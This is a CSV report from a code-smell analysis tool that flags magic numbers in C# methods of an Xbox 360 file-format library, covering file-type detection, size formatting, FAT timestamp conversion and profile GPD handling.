Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x7FF000;  	if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  		xIO.Position = 0xFDA0000;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x7FF000;  	if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  		xIO.Position = 0xFDA0000;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  	xIO.Position = 0xFDA0000;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.FATX;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x130EB0000;  	if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " KB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: size /= 1024;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " MB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: size /= 1024;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " GB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: return (size / (double)1024.0).ToString ("#.00") + " TB";  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: if (xDateTime.Year < 1980)  	xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: if (xDateTime.Year < 1980)  	xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Profile,DashGPD,C:\repos\mtolly_X360\X360\X360\Profile\DashGPD.cs,AddGameViaGPD,The following statement contains a magic number: try {  	string xName = xTitle.GetStringByID ((long)GPDIDs.ThisTitle);  	if (xName == null) {  		xActive = false;  		throw GPDExcepts.NameError;  	}  	if (!xTitle.xErase ())  		return (xActive = false);  	int xsize = 0x28 + ((xName.Length + 1) * 2);  	int xPosition = AllocateData (xsize);  	if (xPosition == -1)  		return (xActive = false);  	XDBFEntry xEnt = new XDBFEntry (NameSpace.Title' xTitle.TitleID' xPosition' xsize' this);  	xIO.Position = xPosition + HeaderSize;  	xIO.Write (xTitle.TitleID);  	xIO.Write ((uint)xTitle.xAchievements.Count);  	xIO.Write (xTitle.xCalcUT ());  	xIO.Write (xTitle.xCalcGSP ());  	xIO.Write (xTitle.xCalcGST ());  	xIO.Write (new byte[0x14]);  	xIO.Write (xName' StringForm.Unicode);  	xIO.Write ((short)0);  	xIO.Flush ();  	TitlePlayedEntry z = new TitlePlayedEntry (xEnt);  	if (!z.LoadDetails ())  		return (xActive = false);  	xTitlesPlayed.Add (z);  	Setting x = xGetSetting (GPDIDs.GCardTitlesPlayed' SettingType.UInt32);  	if (x == null)  		xAddSetting ((long)GPDIDs.GCardTitlesPlayed' xTitlesPlayed.Count' true' SyncType.Locale);  	else {  		uint xdata = (uint)x.Data;  		xdata++;  		x.Data = xdata;  		x.xUpdate (SyncType.Locale);  	}  	UpdateSync (NameSpace.Title' xTitle.TitleID' SyncType.Server);  	return (UpdateHeader () & !(xActive = false));  }  catch {  	return (xActive = false);  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset + 4;  	// int32 for Struct size is constant (0x1C)  	xid = xRef.xIO.ReadInt32 ();  	imageID = xRef.xIO.ReadInt32 ();  	Worth = xRef.xIO.ReadUInt32 ();  	Flg = xRef.xIO.ReadBytes (4);  	TimeL = xRef.xIO.ReadInt64 ();  	try {  		DJsIO xStrings = new DJsIO (xRef.xIO.ReadBytes (Size - 0x1C)' true);  		xTitle = xStrings.ReadString (StringForm.Unicode);  		xDescription1 = xStrings.ReadString (StringForm.Unicode);  		xDescription2 = xStrings.ReadString (StringForm.Unicode);  	}  	catch {  		xTitle = "";  		xDescription1 = "";  		xDescription2 = "";  	}  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
